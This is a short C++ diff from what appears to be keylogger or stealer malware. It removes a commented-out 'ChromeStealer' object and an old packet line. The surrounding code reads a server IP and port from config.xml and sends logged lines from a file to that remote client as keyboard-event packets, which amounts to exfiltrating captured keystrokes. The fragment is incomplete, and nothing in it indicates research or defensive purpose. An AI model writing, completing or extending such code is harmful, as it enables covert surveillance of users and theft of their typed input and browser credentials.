@@ -13,7 +13,6 @@ void Distributor::init(void)
 {
 	std::string ip, port;
 	XMLReader config;
-	//ChromeStealer Steal;
 
 	try {
 		config.readFromFile(StaticTools::GetProjectResourceDirectory() + "\\config.xml");
@@ -74,7 +73,6 @@ void Distributor::sendToSend(void)
 
 	if (ifs) {
 		while (std::getline(ifs, line)) {
-			//*_client << StaticTools::CreatePacket(PacketType::PT_KeyboardEvent, line + '\n');
 			*_client << _client->createPacket(PacketType::PT_KeyboardEvent, line + '\n');
 		}
 		ifs.close();
